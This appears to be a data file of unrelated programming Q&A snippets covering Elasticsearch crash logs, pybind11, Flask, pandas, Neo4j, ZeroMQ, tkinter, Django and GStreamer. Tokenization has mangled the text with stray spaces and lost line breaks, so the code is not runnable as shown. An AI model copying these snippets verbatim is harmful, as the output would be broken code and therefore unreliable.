_process_bulk_chunk raise eelasticsearch.exceptions.ConnectionError : ConnectionError ( ( 'Connection aborted . ' , error ( 111 , 'Connection refused ' ) ) ) caused by : ProtocolError ( ( 'Connection aborted . ' , error ( 111 , 'Connection refused ' ) ) ) # curl -v -X GET 127.0.0.1:9200* Rebuilt URL to : 127.0.0.1:9200/* Hostname was NOT found in DNS cache* Trying 127.0.0.1 ... * connect to 127.0.0.1 port 9200 failed : Connexion refusée* Failed to connect to 127.0.0.1 port 9200 : Connexion refusée* Closing connection 0curl : ( 7 ) Failed to connect to 127.0.0.1 port 9200 : Connexion refusée # sudo service elasticsearch restart total used free shared buffers cachedMem : 883148 667632 215516 17312 61468 421536-/+ buffers/cache : 184628 698520Swap : 102396 0 102396 MemTotal : 883148 kBMemFree : 215492 kBMemAvailable : 675152 kBBuffers : 61472 kBCached : 421536 kBSwapCached : 0 kBActive : 366556 kBInactive : 253416 kBActive ( anon ) : 128720 kBInactive ( anon ) : 25556 kBActive ( file ) : 237836 kBInactive ( file ) : 227860 kBUnevictable : 0 kBMlocked : 0 kBSwapTotal : 102396 kBSwapFree : 102396 kBDirty : 0 kBWriteback : 0 kBAnonPages : 136864 kBMapped : 30956 kBShmem : 17312 kBSlab : 33560 kBSReclaimable : 24684 kBSUnreclaim : 8876 kBKernelStack : 1696 kBPageTables : 1948 kBNFS_Unstable : 0 kBBounce : 0 kBWritebackTmp : 0 kBCommitLimit : 543968 kBCommitted_AS : 1287328 kBVmallocTotal : 1171456 kBVmallocUsed : 1140 kBVmallocChunk : 965220 kBCmaTotal : 8192 kBCmaFree : 36 kB 883148 K total memory 667624 K used memory 366456 K active memory 253416 K inactive memory 215524 K free memory 61476 K buffer memory 421536 K swap cache 102396 K total swap 0 K used swap 102396 K free swap 764663 non-nice user cpu ticks 0 nice user cpu ticks 403552 system cpu ticks 592012076 idle cpu ticks 394292 IO-wait cpu ticks 96 IRQ cpu ticks 8609 softirq cpu ticks 0 stolen cpu ticks 3905593 pages paged in 13767628 pages paged out 0 pages swapped in 0 pages swapped out 503949992 interrupts 198893627 CPU context switches 1460307293 boot time 61556 forks $ sudo service elasticsearch restart $ pythonPython 2.7.9 ( default , Mar 8 2015 , 00:52:26 ) [ GCC 4.9.2 ] on linux2Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > from elasticsearch import Elasticsearch > > > es = Elasticsearch ( [ { 'host ' : 'localhost ' , 'port ' : 9200 } ] ) > > > es < Elasticsearch ( [ { 'host ' : 'localhost ' , 'port ' : 9200 } ] ) > > > > es.get ( index='myindex ' , doc_type='topic ' , id=1 ) elasticsearch.exceptions.NotFoundError : TransportError ( 404 , u ' { `` _index '' : '' myindex '' , '' _type '' : '' topic '' , '' _id '' : '' 1 '' , '' found '' : false } ' ) 2016-04-25 17:38:14,503 ] [ INFO ] [ node ] [ White Pilgrim ] version [ 1.7.4 ] , pid [ 23455 ] , build [ 0d3159b/2015-12-15T11:25:18Z ] [ 2016-04-25 17:38:14,506 ] [ INFO ] [ node ] [ White Pilgrim ] initializing ... [ 2016-04-25 17:38:15,208 ] [ INFO ] [ plugins ] [ White Pilgrim ] loaded [ ] , sites [ ] [ 2016-04-25 17:38:15,542 ] [ INFO ] [ env ] [ White Pilgrim ] using [ 1 ] data paths , mounts [ [ / ( /dev/root ) ] ] , net usable_space [ 8.6gb ] , net total_space [ 14.4gb ] , types [ ext4 ] [ 2016-04-25 17:38:32,689 ] [ INFO ] [ node ] [ White Pilgrim ] initialized [ 2016-04-25 17:38:32,691 ] [ INFO ] [ node ] [ White Pilgrim ] starting ... [ 2016-04-25 17:38:33,241 ] [ INFO ] [ transport ] [ White Pilgrim ] bound_address { inet [ /0:0:0:0:0:0:0:0:9300 ] } , publish_address { inet [ /192.168.1.50:9300 ] } [ 2016-04-25 17:38:33,365 ] [ INFO ] [ discovery ] [ White Pilgrim ] elasticsearch/NWl6pT-_QemJtTvKYkSGCQ [ 2016-04-25 17:38:37,286 ] [ INFO ] [ cluster.service ] [ White Pilgrim ] new_master [ White Pilgrim ] [ NWl6pT-_QemJtTvKYkSGCQ ] [ raspberrypi ] [ inet [ /192.168.1.50:9300 ] ] , reason : zen-disco-join ( elected_as_master ) [ 2016-04-25 17:38:37,449 ] [ INFO ] [ http ] [ White Pilgrim ] bound_address { inet [ /0:0:0:0:0:0:0:0:9200 ] } , publish_address { inet [ /192.168.1.50:9200 ] } [ 2016-04-25 17:38:37,451 ] [ INFO ] [ node ] [ White Pilgrim ] started [ 2016-04-25 17:38:37,664 ] [ INFO ] [ gateway ] [ White Pilgrim ] recovered [ 1 ] indices into cluster_state [ 2016-04-25 17:47:28,176 ] [ INFO ] [ cluster.metadata ] [ White Pilgrim ] [ myindex ] deleting index [ 2016-04-25 17:47:28,964 ] [ INFO ] [ cluster.metadata ] [ White Pilgrim ] [ myindex ] creating index , cause [ api ] , templates [ ] , shards [ 5 ] / [ 1 ] , mappings [ ] [ 2016-04-25 17:47:30,412 ] [ INFO ] [ cluster.metadata ] [ White Pilgrim ] [ myindex ] create_mapping [ modelresult ] [ 2016-04-28 11:15:24,817 ] [ DEBUG ] [ cluster.service ] [ Franklin Hall ] publishing cluster state version 11 [ 2016-04-28 11:15:24,818 ] [ DEBUG ] [ cluster.service ] [ Franklin Hall ] set local cluster state to version 11 [ 2016-04-28 11:15:24,819 ] [ TRACE ] [ cluster.routing ] [ Franklin Hall ] no need to schedule reroute due to delayed unassigned , next_delay_setting [ 0 ] , registered [ 9223372036854775807 ] [ 2016-04-28 11:15:24,827 ] [ DEBUG ] [ river.cluster ] [ Franklin Hall ] processing [ reroute_rivers_node_changed ] : execute [ 2016-04-28 11:15:24,827 ] [ DEBUG ] [ river.cluster ] [ Franklin Hall ] processing [ reroute_rivers_node_changed ] : no change in cluster_state [ 2016-04-28 11:15:24,827 ] [ TRACE ] [ gateway.local.state.meta ] [ Franklin Hall ] [ posepartage ] writing state , reason [ version changed from [ 1 ] to [ 2 ] ] [ 2016-04-28 11:15:24,849 ] [ TRACE ] [ cluster.service ] ack received from node [ [ Franklin Hall ] [ cOT-S342Q7OMtv4z2ZkS9Q ] [ raspberrypi ] [ inet [ /192.168.1.50:9300 ] ] ] , cluster_state update ( version : 11 ) [ 2016-04-28 11:15:24,850 ] [ TRACE ] [ cluster.service ] all expected nodes acknowledged cluster_state update ( version : 11 ) [ 2016-04-28 11:15:24,852 ] [ DEBUG ] [ cluster.service ] [ Franklin Hall ] processing [ put-mapping [ modelresult ] ] : took 240ms done applying updated cluster_state ( version : 11 ) [ 2016-04-28 11:15:24,852 ] [ TRACE ] [ indices.breaker ] [ Franklin Hall ] [ REQUEST ] Adjusted breaker by [ 16432 ] bytes , now [ 16432 ] [ 2016-04-28 11:15:24,863 ] [ TRACE ] [ indices.breaker ] [ Franklin Hall ] [ REQUEST ] Adjusted breaker by [ -16432 ] bytes , now [ 0 ] [ 2016-04-28 11:15:25,427 ] [ TRACE ] [ index.shard ] [ Franklin Hall ] [ myindex ] [ 2 ] index [ modelresult ] [ auth.user.1 ] [ org.elasticsearch.index.mapper.ParseContext $ Document @ 1108529 ] [ 2016-04-28 11:15:25,427 ] [ TRACE ] [ index.shard ] [ Franklin Hall ] [ myindex ] [ 0 ] index [ modelresult ] [ auth.user.3 ] [ org.elasticsearch.index.mapper.ParseContext $ Document @ 1108529 ] [ 2016-04-28 11:15:25,427 ] [ TRACE ] [ index.shard ] [ Franklin Hall ] [ myindex ] [ 1 ] index [ modelresult ] [ auth.user.2 ] [ org.elasticsearch.index.mapper.ParseContext $ Document @ 1108529 ] Apr 28 11:37:48 raspberrypi systemd [ 1 ] : Starting Elasticsearch ... Apr 28 11:37:48 raspberrypi systemd [ 1 ] : Started Elasticsearch.Apr 28 11:38:52 raspberrypi systemd [ 1 ] : elasticsearch.service : main process exited , code=killed , status=6/ABRTApr 28 11:38:52 raspberrypi systemd [ 1 ] : Unit elasticsearch.service entered failed state . Apr 28 11:38:52 raspberrypi rsyslogd-2007 : action 'action 17 ' suspended , next retry is Thu Apr 28 11:39:52 2016 [ try http : //www.rsyslog.com/e/2007 ] avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : [ 2016-04-28 12:09:04,569 ] [ TRACE ] [ indices.breaker ] [ Supreme Intelligence ] [ REQUEST ] Adjusted breaker by [ -16432 ] bytes , now [ 0 ] avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : [ 2016-04-28 12:09:05,337 ] [ TRACE ] [ index.shard ] [ Supreme Intelligence ] [ myindex ] [ 2 ] index [ modelresult ] [ auth.user.1 ] [ org.elasticsearch.index.mapper.ParseContext $ Document @ a2c034 ] avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : [ 2016-04-28 12:09:05,337 ] [ TRACE ] [ index.shard ] [ Supreme Intelligence ] [ myindex ] [ 1 ] index [ modelresult ] [ auth.user.2 ] [ org.elasticsearch.index.mapper.ParseContext $ Document @ 1fcee4a ] avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : [ 2016-04-28 12:09:05,337 ] [ TRACE ] [ index.shard ] [ Supreme Intelligence ] [ myindex ] [ 0 ] index [ modelresult ] [ auth.user.3 ] [ org.elasticsearch.index.mapper.ParseContext $ Document @ 80719c ] avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : [ 2016-04-28 12:09:05,488 ] [ TRACE ] [ index.engine.lucene.iw ] [ Supreme Intelligence ] [ myindex ] [ 1 ] elasticsearch [ Supreme Intelligence ] [ scheduler ] [ T # 1 ] IW : nrtIsCurrent : infoVersion matches : false ; DW changes : false ; BD changes : falseavril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : [ 2016-04-28 12:09:05,495 ] [ TRACE ] [ index.engine.lucene.iw ] [ Supreme Intelligence ] [ myindex ] [ 1 ] elasticsearch [ Supreme Intelligence ] [ refresh ] [ T # 1 ] IW : nrtIsCurrent : infoVersion matches : false ; DW changes : false ; BD changes : falseavril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : [ 2016-04-28 12:09:05,496 ] [ TRACE ] [ index.shard ] [ Supreme Intelligence ] [ myindex ] [ 1 ] refresh with source : scheduleavril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : [ 2016-04-28 12:09:05,500 ] [ TRACE ] [ index.engine.lucene.iw ] [ Supreme Intelligence ] [ myindex ] [ 1 ] elasticsearch [ Supreme Intelligence ] [ refresh ] [ T # 1 ] IW : nrtIsCurrent : infoVersion matches : false ; DW changes : false ; BD changes : falseavril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : [ 2016-04-28 12:09:05,503 ] [ TRACE ] [ index.engine.lucene.iw ] [ Supreme Intelligence ] [ myindex ] [ 1 ] elasticsearch [ Supreme Intelligence ] [ refresh ] [ T # 1 ] IW : flush at getReaderavril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : [ 2016-04-28 12:09:05,504 ] [ TRACE ] [ index.engine.lucene.iw ] [ Supreme Intelligence ] [ myindex ] [ 1 ] elasticsearch [ Supreme Intelligence ] [ refresh ] [ T # 1 ] DW : startFullFlushavril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : Core dumps have been disabled . To enCore dumps have been disabled . To en # avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # A fatal error has been detected by the Java Runtime Environment : avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # Internal Error ( cppInterpreter_arm.S:2625 ) , pid=3481 , tid=625996896avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # fatal error : *** Unimplemented opcode : 232 = < unknown > avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # JRE version : OpenJDK Runtime Environment ( 7.0_95 ) ( build 1.7.0_95-b00 ) avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # Java VM : OpenJDK Zero VM ( 24.95-b01 mixed mode linux-arm ) avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # Derivative : IcedTea 2.6.4avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # Distribution : Raspbian GNU/Linux 8.0 ( jessie ) , package 7u95-2.6.4-1~deb8u1+rpi1avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # Failed to write core dump . Core dumps have been disabled . To enable core dumping , try `` ulimit -c unlimited '' before starting Java againavril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # An error report file with more information is saved as : avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # /tmp/hs_err_pid3481.logavril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # If you would like to submit a bug report , please includeavril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # instructions on how to reproduce the bug and visit : avril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # http : //icedtea.classpath.org/bugzillaavril 28 12:09:05 raspberrypi elasticsearch [ 3481 ] : # avril 28 12:09:05 raspberrypi systemd [ 1 ] : elasticsearch.service : main process exited , code=killed , status=6/ABRTavril 28 12:09:05 raspberrypi systemd [ 1 ] : Unit elasticsearch.service entered failed state ."
"# include < pybind11/pybind11.h > # include < boost/lexical_cast.hpp > # include < iostream > # include < iomanip > # include < algorithm > # include < vector > std : :string castToString ( double v ) { std : :string str = boost : :lexical_cast < std : :string > ( v ) ; return str ; } std : :vector < std : :vector < std : :string > > num2StringVector ( std : :vector < std : :vector < double > > & inputVector ) { //using namespace boost : :multiprecision ; std : :vector < std : :vector < std : :string > > outputVector ; std : :transform ( inputVector.begin ( ) , inputVector.end ( ) , std : :back_inserter ( outputVector ) , [ ] ( const std : :vector < double > & iv ) { std : :vector < std : :string > dv ; std : :transform ( iv.begin ( ) , iv.end ( ) , std : :back_inserter ( dv ) , & castToString ) ; return dv ; } ) ; return outputVector ; } namespace py = pybind11 ; PYBIND11_PLUGIN ( num2String ) { py : :module m ( `` num2String '' , `` pybind11 example plugin '' ) ; m.def ( `` num2StringVector '' , & num2StringVector , `` this converts a vector of doubles to a vector of strings . `` ) ; m.def ( `` castToString '' , & castToString , `` This function casts a double to a string using Boost . `` ) ; return m.ptr ( ) ; } c++ -O3 -shared -std=gnu++11 -I ../include ` python-config -- cflags -- ldflags -- libs ` num2StringVectorPyBind.cpp -o num2String.so -fPIC -lquadmath import num2Stringvalues = [ [ 10 , 20 ] , [ 30 , 40 ] ] num2String.num2StringVector ( values )"
"class Notes ( db.Model ) : text = db.StringProperty ( multiline=True ) date = db.DateTimeProperty ( auto_now_add=True ) class MainPage ( webapp2.RequestHandler ) : def get ( self ) : notes = Notes.all ( ) self.render_template ( `` index.html '' , { 'notes ' : notes } ) { % for note in notes % } < p > { { note.text } } < br > { { note.date } } < br > ( < a href = '' edit/ { { note.key.id } } '' > edit < /a > ) { % endfor % }"
"date hourse_spent emp_id 9/11/2016 8 1 15/11/2016 8 1 22/11/2016 8 2 23/11/2016 8 1 cycle hourse_spent emp_id 1/11/2016-15/11/2016 16 116/11/2016-31/11/2016 8 216/11/2016-31/11/2016 8 1 data.set_index ( 'date ' , inplace=True ) print data.head ( ) dt = data.groupby ( [ 'emp_id ' , pd.Grouper ( key='date ' , freq='MS ' ) ] ) [ 'hours_spent ' ] .sum ( ) .reset_index ( ) .sort_values ( 'date ' ) # df.resample ( '10d ' ) .mean ( ) .interpolate ( method='linear ' , axis=0 ) print dt.resample ( 'SMS ' ) .sum ( ) df1 = dt.resample ( 'MS ' , loffset=pd.Timedelta ( 15 , 'd ' ) ) .sum ( ) data.set_index ( 'date ' , inplace=True ) df1 = data.resample ( 'MS ' , loffset=pd.Timedelta ( 15 , 'd ' ) ) .sum ( )"
"from flask.views import Viewclass ShowUsers ( View ) : def dispatch_request ( self ) : users = User.query.all ( ) return render_template ( 'users.html ' , objects=users ) app.add_url_rule ( '/users/ ' , view_func=ShowUsers.as_view ( 'show_users ' ) ) x = `` '' def foo ( ) : global x x = request.form [ `` fizz '' ] def bar ( ) : # do something with x ( readable ) print ( x ) def baz ( ) : return someMadeupFunction ( x ) def foo ( ) : x = request.form [ `` fizz '' ] qux ( someValue ) def qux ( i ) : menu = { key0 : bar , key1 : baz , } menu [ i ] ( x ) def bar ( x ) : # do something with x ( readable ) print ( x ) def baz ( x ) : return someMadeupFunction ( x )"
"from neo4j.v1 import GraphDatabasedriver = GraphDatabase.driver ( uri= '' bolt : //localhost:7687 '' , auth= ( `` neo4j '' , `` 12345 '' ) )"
"a = pd.read_csv ( `` a.csv '' ) b = pd.read_csv ( `` b.csv '' ) # a.csv = ID TITLE # b.csv = ID NAMEb = b.dropna ( axis=1 ) merged = a.merge ( b , on='title ' ) merged.to_csv ( `` output.csv '' , index=False ) Headers : TOWN NAME LOCATION HEIGHT STAR Headers : COUNTRY WEIGHT NAME AGE MEASUREMENT Data : UK , 150lbs , John , 6 , 6ft Headers : TOWN NAME LOCATION HEIGHT STARData : ( Blank ) John , UK , 6ft ( Blank )"
"flask.debughelpers.UnexpectedUnicodeErrorUnexpectedUnicodeError : A byte string with non-ASCII data was passed to the session system which can only store unicode strings . Consider base64 encoding your string ( String was 'iB\rOU # \xf7BO\x08^\xa6\xd1 ) v\xad ' ) Traceback ( most recent call last ) File `` /srv/www/li/venv/lib/python2.7/site-packages/flask/app.py '' , line 1836 , in __call__return self.wsgi_app ( environ , start_response ) File `` /srv/www/li/venv/lib/python2.7/site-packages/flask/app.py '' , line 1820 , in wsgi_appresponse = self.make_response ( self.handle_exception ( e ) ) File `` /srv/www/li/venv/lib/python2.7/site-packages/flask/app.py '' , line 1403 , in handle_exceptionreraise ( exc_type , exc_value , tb ) File `` /srv/www/li/venv/lib/python2.7/site-packages/flask/app.py '' , line 1817 , in wsgi_appresponse = self.full_dispatch_request ( ) File `` /srv/www/li/venv/lib/python2.7/site-packages/flask/app.py '' , line 1479 , in full_dispatch_requestresponse = self.process_response ( response ) File `` /srv/www/li/venv/lib/python2.7/site-packages/flask/app.py '' , line 1693 , in process_responseself.save_session ( ctx.session , response ) File `` /srv/www/li/venv/lib/python2.7/site-packages/flask/app.py '' , line 837 , in save_sessionreturn self.session_interface.save_session ( self , session , response ) File `` /srv/www/li/venv/lib/python2.7/site-packages/flask/sessions.py '' , line 321 , in save_sessionval = self.get_signing_serializer ( app ) .dumps ( dict ( session ) ) File `` /srv/www/li/venv/lib/python2.7/site-packages/itsdangerous.py '' , line 471 , in dumpsreturn self.make_signer ( salt ) .sign ( self.dump_payload ( obj ) ) File `` /srv/www/li/venv/lib/python2.7/site-packages/itsdangerous.py '' , line 676 , in dump_payloadjson = super ( URLSafeSerializerMixin , self ) .dump_payload ( obj ) File `` /srv/www/li/venv/lib/python2.7/site-packages/itsdangerous.py '' , line 454 , in dump_payloadreturn self.serializer.dumps ( obj ) File `` /srv/www/li/venv/lib/python2.7/site-packages/flask/sessions.py '' , line 82 , in dumpsreturn json.dumps ( _tag ( value ) , separators= ( ' , ' , ' : ' ) ) File `` /srv/www/li/venv/lib/python2.7/site-packages/flask/sessions.py '' , line 72 , in _tagreturn dict ( ( k , _tag ( v ) ) for k , v in iteritems ( value ) ) File `` /srv/www/li/venv/lib/python2.7/site-packages/flask/sessions.py '' , line 72 , in < genexpr > return dict ( ( k , _tag ( v ) ) for k , v in iteritems ( value ) ) File `` /srv/www/li/venv/lib/python2.7/site-packages/flask/sessions.py '' , line 80 , in _tagu'base64 encoding your string ( String was % r ) ' % value ) UnexpectedUnicodeError : A byte string with non-ASCII data was passed to the session system which can only store unicode strings . Consider base64 encoding your string ( String was 'iB\rOU # \xf7BO\x08^\xa6\xd1 ) v\xad ' )"
@ gen.coroutinedef do_find_one ( ) : document = yield db.users.find_one ( ) print ( document )
"... self.context = zmq.Context ( ) self.socket = self.context.socket ( zmq.PUB ) self.socket.bind ( 'tcp : // % s : % d ' % ( ' 0.0.0.0 ' , 5555 ) ) ..."
"import tkinter as tkclass GameApp ( object ) : `` '' '' An object for the game window . Attributes : master : Main window tied to the application canvas : The canvas of this window `` '' '' def __init__ ( self , master ) : `` '' '' Initialize the window and canvas of the game. `` '' '' self.master = master self.master.title = `` Game '' self.master.geometry ( ' { } x { } '.format ( 500 , 500 ) ) self.canvas = tk.Canvas ( self.master ) self.canvas.pack ( side= '' top '' , fill= '' both '' , expand=True ) self.start_game ( ) # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # def start_game ( self ) : `` '' '' Actual loading of the game. `` '' '' player = Player ( self ) # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # class Player ( object ) : `` '' '' The player of the game . Attributes : color : color of sprite ( string ) dimensions : dimensions of the sprite ( array ) canvas : the canvas of this sprite ( object ) window : the actual game window object ( object ) momentum : how fast the object is moving ( array ) `` '' '' def __init__ ( self , window ) : self.color = `` '' self.dimensions = [ 225 , 225 , 275 , 275 ] self.window = window self.properties ( ) # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # def properties ( self ) : `` '' '' Establish the properties of the player. `` '' '' self.color = `` blue '' self.momentum = [ 5 , 0 ] self.draw ( ) self.mom_calc ( ) # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # def draw ( self ) : `` '' '' Draw the sprite. `` '' '' self.sprite = self.window.canvas.create_rectangle ( *self.dimensions , fill=self.color , outline=self.color ) # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # def mom_calc ( self ) : `` '' '' Calculate the actual momentum of the thing `` '' '' self.window.canvas.move ( self.sprite , *self.momentum ) self.window.master.after ( 2 , self.mom_calc ) # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # root = tk.Tk ( ) game_window = GameApp ( root ) > > > print ( timeit.timeit ( `` ( self.window.master.after ( 2 , self.mom_calc ) ) '' , number=10000 , globals= { `` self '' : self } ) ) 0.5395521819053108"
"class TestItemModel ( models.Model ) : value = models.IntegerField ( default=0 ) relies_on_item = models.ForeignKey ( 'self ' , on_delete=models.SET_NULL , blank=True , null=True ) > > > end_product = TestItemModel ( value=1 ) > > > end_product.save ( ) > > > container_product = TestItemModel ( value=10 , relies_on_item=end_product ) > > > container_product.save ( ) > > > end_product.pk12 > > > end_product_for_update=TestItemModel.objects.get ( pk=12 ) > > > end_product_for_update.value = 4 > > > end_product_for_update.save ( ) > > > container_product.relies_on_item.value1 > > > container_product.refresh_from_db ( ) > > > container_product.relies_on_item.value1 > > > container_product.relies_on_item.refresh_from_db ( ) > > > container_product.relies_on_item.value4"
pytz.timezone ( `` US/Eastern '' )
"In [ 41 ] : def f_no_dot ( mat , arr ) : ... . : return mat/arrIn [ 42 ] : def f_dot ( mat , arr ) : ... . : denominator = scipy.dot ( arr , scipy.ones ( ( 1,2 ) ) ) ... . : return mat/denominatorIn [ 43 ] : mat = scipy.rand ( 360000,2 ) In [ 44 ] : arr = scipy.rand ( 360000,1 ) In [ 45 ] : timeit temp = f_no_dot ( mat , arr ) 10 loops , best of 3 : 44.7 ms per loopIn [ 46 ] : timeit temp = f_dot ( mat , arr ) 100 loops , best of 3 : 10.1 ms per loop"
"[ xcb ] Unknown request in queue while dequeuing [ xcb ] Most likely this is a multi-threaded client and XInitThreads has not been called [ xcb ] Aborting , sorry about that.python3 : ../../src/xcb_io.c:179 : dequeue_pending_request : Assertion ` ! xcb_xlib_unknown_req_in_deq ' failed . import gigi.require_version ( 'Gtk ' , ' 3.0 ' ) gi.require_version ( 'Gst ' , ' 1.0 ' ) gi.require_version ( 'GstVideo ' , ' 1.0 ' ) from gi.repository import Gtk , xlibfrom gi.repository import Gst , Gdk , GdkX11 , GstVideoGst.init ( None ) Gst.init_check ( None ) # Place 1from ctypes import cdllx11 = cdll.LoadLibrary ( 'libX11.so ' ) x11.XInitThreads ( ) # [ xcb ] Unknown request in queue while dequeuing # [ xcb ] Most likely this is a multi-threaded client and XInitThreads has not been called # [ xcb ] Aborting , sorry about that. # python3 : ../../src/xcb_io.c:179 : dequeue_pending_request : Assertion ` ! xcb_xlib_unknown_req_in_deq ' failed. # ( foo.py:31933 ) : Gdk-WARNING ** : foo.py : Fatal IO error 11 ( Resource temporarily unavailable ) on X server :1.class PipelineManager ( object ) : def __init__ ( self , window , pipeline ) : self.window = window if isinstance ( pipeline , str ) : pipeline = Gst.parse_launch ( pipeline ) self.pipeline = pipeline bus = pipeline.get_bus ( ) bus.set_sync_handler ( self.bus_callback ) pipeline.set_state ( Gst.State.PLAYING ) def bus_callback ( self , bus , message ) : if message.type is Gst.MessageType.ELEMENT : if GstVideo.is_video_overlay_prepare_window_handle_message ( message ) : Gdk.threads_enter ( ) Gdk.Display.get_default ( ) .sync ( ) win = self.window.get_property ( 'window ' ) if isinstance ( win , GdkX11.X11Window ) : message.src.set_window_handle ( win.get_xid ( ) ) else : print ( 'Nope ' ) Gdk.threads_leave ( ) return Gst.BusSyncReply.PASSpipeline = Gst.parse_launch ( 'videotestsrc ! xvimagesink sync=false ' ) window = Gtk.ApplicationWindow ( ) header_bar = Gtk.HeaderBar ( ) header_bar.set_show_close_button ( True ) # window.set_titlebar ( header_bar ) # Place 2drawing_area = Gtk.DrawingArea ( ) drawing_area.connect ( 'realize ' , lambda widget : PipelineManager ( widget , pipeline ) ) window.add ( drawing_area ) window.show_all ( ) def on_destroy ( win ) : try : Gtk.main_quit ( ) except KeyboardInterrupt : passwindow.connect ( 'destroy ' , on_destroy ) Gtk.main ( )"
var x = list.Where ( i = > i > N ) .Min ( ) ;
"Traceback ( most recent call last ) : File `` /usr/local/lib/python2.6/dist-packages/gevent-0.13.1-py2.6-linux-x86_64.egg/gevent/greenlet.py '' , line 405 , in run result = self._run ( *self.args , **self.kwargs ) File `` /data/www/spider/daemon/scripts/mainconverter.py '' , line 72 , in work for item in res : File `` /usr/local/lib/python2.6/dist-packages/pymongo-1.9_-py2.6-linux-x86_64.egg/pymongo/cursor.py '' , line 601 , in next if len ( self.__data ) or self._refresh ( ) : File `` /usr/local/lib/python2.6/dist-packages/pymongo-1.9_-py2.6-linux-x86_64.egg/pymongo/cursor.py '' , line 564 , in _refresh self.__query_spec ( ) , self.__fields ) ) File `` /usr/local/lib/python2.6/dist-packages/pymongo-1.9_-py2.6-linux-x86_64.egg/pymongo/cursor.py '' , line 521 , in __send_message **kwargs ) File `` /usr/local/lib/python2.6/dist-packages/pymongo-1.9_-py2.6-linux-x86_64.egg/pymongo/connection.py '' , line 743 , in _send_message_with_response return self.__send_and_receive ( message , sock ) File `` /usr/local/lib/python2.6/dist-packages/pymongo-1.9_-py2.6-linux-x86_64.egg/pymongo/connection.py '' , line 724 , in __send_and_receive return self.__receive_message_on_socket ( 1 , request_id , sock ) File `` /usr/local/lib/python2.6/dist-packages/pymongo-1.9_-py2.6-linux-x86_64.egg/pymongo/connection.py '' , line 714 , in __receive_message_on_socket struct.unpack ( `` < i '' , header [ 8:12 ] ) [ 0 ] ) AssertionError : ids do n't match -561338340 0 < Greenlet at 0x2baa628 : < bound method Worker.work of < scripts.mainconverter.Worker object at 0x2ba8450 > > > failed with AssertionError"
"> > > import lxml.html > > > page = lxml.html.parse ( `` http : //www.webcom.com/html/tutor/forms/start.shtml '' ) > > > form = page.getroot ( ) .forms [ 0 ] > > > form.fields [ 'your_name ' ] = 'Morphit ' > > > result = lxml.html.parse ( lxml.html.submit_form ( form ) ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /usr/lib/python3.3/site-packages/lxml/html/__init__.py '' , line 887 , in submit_form return open_http ( form.method , url , values ) File `` /usr/lib/python3.3/site-packages/lxml/html/__init__.py '' , line 907 , in open_http_urllib return urlopen ( url , data ) File `` /usr/lib/python3.3/urllib/request.py '' , line 160 , in urlopen return opener.open ( url , data , timeout ) File `` /usr/lib/python3.3/urllib/request.py '' , line 471 , in open req = meth ( req ) File `` /usr/lib/python3.3/urllib/request.py '' , line 1183 , in do_request_ raise TypeError ( msg ) TypeError : POST data should be bytes or an iterable of bytes . It can not be of type str ."
"import pandas as pdfrom sklearn.base import TransformerMixin , BaseEstimatorclass dummy_var_encoder ( TransformerMixin , BaseEstimator ) : `` 'Convert selected categorical column to ( set of ) dummy variables `` ' def __init__ ( self , column_to_dummy='default_col_name ' ) : self.column = column_to_dummy print self.column def fit ( self , X_DF , y=None ) : return self def transform ( self , X_DF ) : `` ' Update X_DF to have set of dummy-variables instead of orig column '' ' # convert self-attribute to local var for ease of stepping through function column = self.column # add columns for new dummy vars , and drop original categorical column dummy_matrix = pd.get_dummies ( X_DF [ column ] , prefix=column ) new_DF = pd.concat ( [ X_DF [ column ] , dummy_matrix ] , axis=1 ) return new_DF from sklearn import datasets # Load toy data iris = datasets.load_iris ( ) X = pd.DataFrame ( iris.data , columns = iris.feature_names ) y = pd.Series ( iris.target , name= ' y ' ) # Create Arbitrary categorical featuresX [ 'category_1 ' ] = pd.cut ( X [ 'sepal length ( cm ) ' ] , bins=3 , labels= [ 'small ' , 'medium ' , 'large ' ] ) X [ 'category_2 ' ] = pd.cut ( X [ 'sepal width ( cm ) ' ] , bins=3 , labels= [ 'small ' , 'medium ' , 'large ' ] ) encoder = dummy_var_encoder ( column_to_dummy = 'category_1 ' ) encoder.fit ( X ) encoder.transform ( X ) .iloc [ 15:21 , : ] 